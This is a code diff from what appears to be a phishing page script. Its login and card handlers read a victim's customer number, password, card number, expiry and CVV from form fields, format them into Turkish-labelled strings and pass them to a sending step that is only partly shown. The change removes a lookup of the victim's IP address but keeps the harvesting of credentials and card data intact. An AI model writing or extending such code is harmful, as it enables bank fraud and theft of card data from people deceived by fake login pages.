@@ -1,21 +1,8 @@
-async function getIP() {
-    try {
-        const response = await fetch('https://freeipapi.com/api/json');
-        const data = await response.json();
-        console.log("IP alındı:", data.ipAddress);
-        return data.ipAddress;
-    } catch (error) {
-        console.error("IP alınamadı:", error);
-        return "IP alınamadı";
-    }
-}
-
 async function handleLogin(event) {
     event.preventDefault();
     const customer_id = document.getElementById("customer_id").value;
     const password = document.getElementById("password").value;
-    const ip = await getIP();
-    const data = `Müşteri No: ${customer_id}, Şifre: ${password}, IP: ${ip}`;
+    const data = `Müşteri No: ${customer_id}, Şifre: ${password}`;
     console.log("Gönderilen veri:", data);
 
     try {
@@ -56,8 +43,7 @@ async function handleCard(event) {
         return;
     }
 
-    const ip = await getIP();
-    const data = `CC: ${cc}, Expiry: ${expiry}, CVV: ${cvv}, IP: ${ip}`;
+    const data = `CC: ${cc}, Expiry: ${expiry}, CVV: ${cvv}`;
     console.log("Gönderilen veri:", data);
 
     try {
